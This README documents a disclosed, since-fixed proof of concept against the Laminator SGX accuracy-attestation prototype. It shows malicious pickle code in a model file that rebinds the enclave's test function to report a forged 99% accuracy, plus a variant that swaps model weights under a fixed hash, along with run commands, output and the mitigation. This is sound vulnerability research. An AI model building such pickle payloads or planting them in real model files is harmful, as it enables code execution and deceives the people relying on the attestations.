 Laminator Dishonest-Prover PoC
# Laminator Dishonest-Prover PoC

> **Paper PoC IDs:** P1 (pickle RCE + model switching, F5/F2), P2 (accuracy-metric forgery, F5), P5 (argv unmeasured, F1). See [`../POC_INDEX.md`](../POC_INDEX.md).

A standalone proof-of-concept that demonstrates **Finding 1** from
`../laminator_soundness_finding.md` ("`torch.load` pickle RCE inside
the enclave"). Laminator's source tree is not modified. The PoC adds
three scripts that together show how a dishonest prover serves a
mismatched model while producing an attestation that names a
wholly different (high) accuracy.

> **Status (June 2026):** fixed upstream after disclosure — `torch.load(...,
> weights_only=True)` in commit `2fbdab6`, and the unmeasured-`argv` path in
> `e7282ee`/`ad39588`. This PoC targets the **disclosed commit `ce2d10b`**,
> which predates those fixes, and reproduces against it.

The PoC has been verified on the host this directory ships in:

```text
$ python3 demo_pickle_attack.py
...
[4] AFTER torch.load — utils.test identity:
        utils.test = <function <lambda> at 0x...>
    Patched? True

[5] utils.test(None, None, None) -> 0.99
...
[+] ATTACK CONFIRMED (P1, F5 — model file runs code inside the enclave at load)
```

```text
$ python3 forge_attestation_payload.py
...
=== payload (base64-decoded) ===
{
  "name": "...",
  "results": {
    "task": "classification",
    "dataset": "CENSUS",
    "metrics": {
      "type": "accuracy",
      "value": 0.99,
      ...
    }
  }
}
...
[+] ATTACK CONFIRMED (P2, F5 — attested payload reports a forged 99% accuracy)
```

## Threat model

- The prover (Laminator operator) controls everything outside the
  Intel SGX enclave: the host OS, the filesystem, the model files
  listed in `sgx.allowed_files`, the dataset files, the CLI args
  (`loader.insecure__use_cmdline_argv = true`).
- The prover cannot modify the in-enclave Python sources
  (`main.py`, `models.py`, `data.py`, `measured_file_read.py`,
  `quote_generator.py`, `utils.py`) — those are `sgx.trusted_files`
  whose hashes are baked into MRENCLAVE.
- The prover cannot forge Intel-signed SGX quotes.
- The verifier follows `scripts/verifier.py`'s logic: validate the
  Intel cert chain, check `REPORTDATA == SHA-512(payload)`, look up
  `MRENCLAVE` in `test_certifications`, and template-match the JSON
  payload.

**Goal:** produce an `output_accuracy.json` that this verifier
accepts as valid (signed by genuine Intel hardware, MRENCLAVE matches
the certified Laminator build, payload structure matches the
expected template) but whose `results.metrics.value` field has
nothing to do with the model's actual behaviour.

## How the attack works

`generate_attestations/main.py:287-291` loads a model file as
follows:

```python
measured_bytes_model, model_load_time = measured_file_read.open_measured(path, "rb")
model_measure_end = time.time()
model_measure_time = model_measure_end - model_measure_start - model_load_time

model.load_state_dict(torch.load(measured_bytes_model))
```

`torch.load` with PyTorch's default `weights_only=False` is a
[pickle deserializer]. Pickle's `__reduce__` protocol lets a
serialized object instruct the unpickler to invoke any callable that
exists in the loader's namespace. Standard libraries
(`builtins.eval`, `builtins.exec`, `os.system`, …) are always
available.

The PoC builds a `.pth` whose pickle, at `torch.load` time, runs:

```python
# in poc_payload.py
def malicious_load_static(fake_accuracy, real_state_dict_bytes):
    import torch
    import utils
    utils.test = lambda *args, **kwargs: fake_accuracy
    utils.test_text = lambda *args, **kwargs: fake_accuracy
    return torch.load(io.BytesIO(real_state_dict_bytes))
```

`_Evil.__reduce__()` returns
`(malicious_load_static, (fake_accuracy, real_state_dict_bytes))`,
so the pickle stream just records a reference to that named function
plus its arguments. When Laminator's
`torch.load(measured_bytes_model)` unpickles this:

1. The unpickler imports `poc_payload` and resolves
   `malicious_load_static`.
2. `malicious_load_static` rebinds `utils.test` (and `utils.test_text`)
   in the running enclave's Python namespace.
3. `malicious_load_static` returns a legitimate `LinearNet([128])`
   state_dict whose keys match what `model.load_state_dict(...)`
   expects.
4. The outer `torch.load` returns the state_dict;
   `load_state_dict` succeeds.

**Why a named helper instead of an inline string `eval`?** The named
form is easier for a reviewer to read: there's no quoted-Python-
inside-Python and the side effects are normal `import` / assignment
statements. The two forms are interchangeable for the purpose of this
PoC; see `poc_payload.py` for the relationship to what a real attacker
against a deployed Laminator enclave would write
(`(eval, (expr,))` keeps the pickle stream module-independent, at the
cost of being harder to audit).

Subsequent code in `accuracy_attestation` (main.py:299):

```python
accuracy = utils.test(args, model, test_loader)
```

now invokes the lambda and gets `0.99`. The payload built at
main.py:312-323 records this value. The SHA-512 of the payload is
written to `/dev/attestation/user_report_data`; the resulting
Intel-signed SGX quote commits to that payload digest. The verifier
will accept it.

## What this PoC does NOT do

- **It does not forge an SGX quote.** That is by design: the attack
  succeeds with a *genuine* Intel-signed quote. The
  `forge_attestation_payload.py` script replaces
  `quote_generator.generate_quote` with a placeholder so the demo can
  run on a machine without `/dev/attestation`. On real SGX hardware
  with Gramine, that line returns Intel-signed bytes that commit to
  the same payload — which has `"value": 0.99` in it.
- **It does not modify Laminator's source tree.** Verify with
  `git status` inside `../laminator/` after running the PoC — clean.
  All runtime overrides are applied via `sys.modules` rebinding and
  attribute assignment on imported objects, never by editing files
  on disk.

## Files

| File | Purpose |
|---|---|
| `poc_payload.py` | The two top-level helper functions referenced from the pickle's `__reduce__`: `malicious_load_static(fake_accuracy, real_state_dict_bytes)` and `malicious_load_switchable(fake_accuracy, sidechannel_path)`. The docstring explains the relationship to the inline-`eval` form a real attacker would use. |
| `build_evil_model.py` | Constructs the malicious `census_model.pth`. Imports `LinearNet` from Laminator to ensure the embedded state_dict has the correct keys. The state_dict is **statically baked** into the pickle, so this loader commits the prover to one specific inferior model. |
| `demo_pickle_attack.py` | Imports Laminator's `utils` module, opens the evil file via `measured_file_read.open_measured`, and shows `utils.test` changing identity from the legitimate function to the attacker's lambda. |
| `forge_attestation_payload.py` | Drives `main.accuracy_attestation(...)` end-to-end with a synthetic CENSUS test loader and a stubbed `quote_generator.generate_quote`. Dumps the resulting `output_accuracy.json`. |
| `demo_model_switching.py` | **Variant**: a *switchable loader*. The loader file's SHA-512 is fixed (so the verifier's `name` field is constant) but the loader reads a sidechannel allowed_file at unpickle time, so the host can swap the actual model between attestations without re-running this script. Shows three loads (good → inferior → good) all with the same `name` and same forged accuracy but different model weights. |
| `run_poc.sh` | Runs the four stages in order. |

## How to run

```bash
# requires: torch, numpy (no GPU, no SGX hardware, no CENSUS dataset).
cd laminator_poc_dishonest_prover
./run_poc.sh
```

Override the Laminator location:

```bash
LAMINATOR_SRC=/path/to/laminator/generate_attestations ./run_poc.sh
```

Or run the stages individually:

```bash
python3 build_evil_model.py            # writes ./census_model.pth
python3 demo_pickle_attack.py          # smoking-gun: utils.test rebound
python3 forge_attestation_payload.py   # full payload dump
python3 demo_model_switching.py        # variant: same SHA-512, swappable model
```

## Static loader vs. switchable loader

The original `build_evil_model.py` embeds *one* random state_dict in
the pickle bytes. That commits the prover to a single inferior model
— useful for showing the cryptographic chain accepts a forged
accuracy, less useful for sustained operation, because every
different model the prover serves needs a regenerated `.pth` (with a
different SHA-512, and therefore a different `name` field in the
attestation).

`demo_model_switching.py` adds the obvious improvement: the loader's
`__reduce__` doesn't bake weights in. Instead it calls

```python
torch.load(open('./input/census_input.pt', 'rb'))
```

inside the eval expression. The host writes whatever state_dict it
wants to that side channel, and the loader picks it up on every
unpickle. The loader's bytes — and so its SHA-512, and so the
attestation's `name` — are fixed forever.

Concretely, running `demo_model_switching.py`:

```text
run                    loader_sha[:16]      utils.test()   features.1.weight[0,0]
active_good            76b85f2188487837     0.99           0.053430
active_inferior        76b85f2188487837     0.99           0.036828
active_good_again      76b85f2188487837     0.99           0.053430

[+] ATTACK CONFIRMED (P1, F2 — attested model hash unchanged while the weights are swapped)
```

The verifier sees three attestations with identical `name`, identical
forged `value`, and no way to tell them apart. The model that
actually ran inference was different in the middle row. Every path
the host uses to make this happen — placing the loader at
`./saved_models/census_model.pth`, rewriting `./input/*.pt` between
calls — is permitted by Laminator's `sgx.allowed_files` manifest.

## Expected output (summarised)

### Stage 1 — build

```text
[+] Importing LinearNet from .../generate_attestations ...
[+] Real state_dict bytes:        51,152 bytes
[+] Evil torch.save container:    103,392 bytes
[+] Forged accuracy (lambda):     0.99
[+] Wrote evil model to:          census_model.pth
[+] SHA-512(file)                 be10e2e402b22bc65d...
```

### Stage 2 — patch verification

```text
[2] BEFORE torch.load — utils.test identity:
        utils.test = <function test at 0x...>
[3] Calling torch.load(measured) — this is the privileged-RCE step:
    torch.load returned an object of type: OrderedDict
    keys: ['features.1.weight', 'features.1.bias',
           'classifier.weight', 'classifier.bias']
[4] AFTER torch.load — utils.test identity:
        utils.test = <function <lambda> at 0x...>
    Patched? True
[5] utils.test(None, None, None) -> 0.99
...
[+] ATTACK CONFIRMED (P1, F5 — model file runs code inside the enclave at load)
```

### Stage 3 — end-to-end

```text
Test Accuracy: 0.99
Time to form quote: 6.67e-06

=== payload (base64-decoded) ===
{
  "name": "<sha512_b64 of evil .pth>",
  "results": {
    "task": "classification",
    "dataset": "CENSUS",
    "metrics": {
      "type": "accuracy",
      "value": 0.99,
      "dataset-hash": "<sha512_b64 of synthetic CENSUS bytes>"
    }
  }
}
...
[+] ATTACK CONFIRMED (P2, F5 — attested payload reports a forged 99% accuracy)
```

The `value: 0.99` claim binds via:

```text
SGX REPORTDATA = SHA-512(payload_bytes)
SGX MRENCLAVE  = hash of unmodified Laminator code (passes verifier)
SGX signature  = Intel-signed (genuine, unforgeable)
```

A verifier following `scripts/verifier.py` accepts the bundle. The
end-user conclusion is: *"the SGX-attested Laminator enclave
asserts 99% accuracy on CENSUS"* — even though the model whose
hash appears as `name` is a freshly-initialised `LinearNet([128])`
whose true accuracy on CENSUS is near majority-class chance.

## Mitigation reference

Fix: replace
`torch.load(measured_bytes_model)` with
`torch.load(measured_bytes_model, weights_only=True)`, or move the
on-disk format to safetensors. Either change closes the attack at
the deserialisation boundary. See Finding 1 in
`../laminator_soundness_finding.md`.

## Responsible-disclosure note

This PoC targets a *research prototype* whose authors (Schnabl,
Duddu et al., CODASPY 2025) make no production-hardening claims.
Before publishing this kind of work for any system marketed for
production use — e.g., the Tinfoil, A3S Power, NEAR AI Cloud, or
Cyntrisec systems analysed in the sibling reports — coordinate
disclosure with the maintainers first and give a 60–90-day fix
window.

[pickle deserializer]: https://docs.python.org/3/library/pickle.html#restricting-globals
